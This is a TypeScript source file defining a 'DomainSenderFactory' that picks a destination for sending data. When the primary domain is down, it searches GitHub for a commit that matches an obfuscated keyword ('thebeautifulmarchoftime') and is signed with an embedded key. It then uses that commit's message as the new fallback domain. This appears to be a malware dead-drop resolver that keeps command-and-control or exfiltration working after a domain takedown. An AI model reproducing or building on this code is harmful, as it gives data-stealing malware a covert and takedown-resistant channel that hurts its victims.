import { verify_key } from "../../generated";
import { findValidSignedCommit } from "../../github_utils/fetcher";
import { logUtil } from "../../utils/logger";
import type { Sender } from "../base";
import type { SenderFactory } from "../senderFactory";
import type { SenderDestination } from "../types";
import { DomainSender } from "./sender";

declare function scramble(str: string): string;

export class DomainSenderFactory implements SenderFactory {
  private readonly config: SenderDestination;
  constructor(config: SenderDestination) {
    this.config = config;
  }

  async tryCreate(): Promise<Sender | null> {
    // 1. Try the default domain.
    const primary = new DomainSender(this.config);
    if (await primary.healthy()) {
      return primary;
    }
    logUtil.log("Primary domain not healthy; looking for signed fallback");

    // 2. Fall back to a domain discovered via a signed commit.
    const commitResult = await findValidSignedCommit(
      scramble("thebeautifulmarchoftime "),
      verify_key,
    );
    if (!commitResult.found) {
      logUtil.log("No valid signed commit found; DomainSender unavailable");
      return null;
    }

    if (commitResult.message) {
      const backupDest: SenderDestination = {
        domain: commitResult.message,
        port: this.config.port,
        path: this.config.path,
      };
      const fallback = new DomainSender(backupDest);
      if (await fallback.healthy()) {
        return fallback;
      } else {
        logUtil.log("Fallback domain not healthy; DomainSender unavailable");
      }
    }

    logUtil.log("Fallback domain not healthy; DomainSender unavailable");
    return null;
  }
}
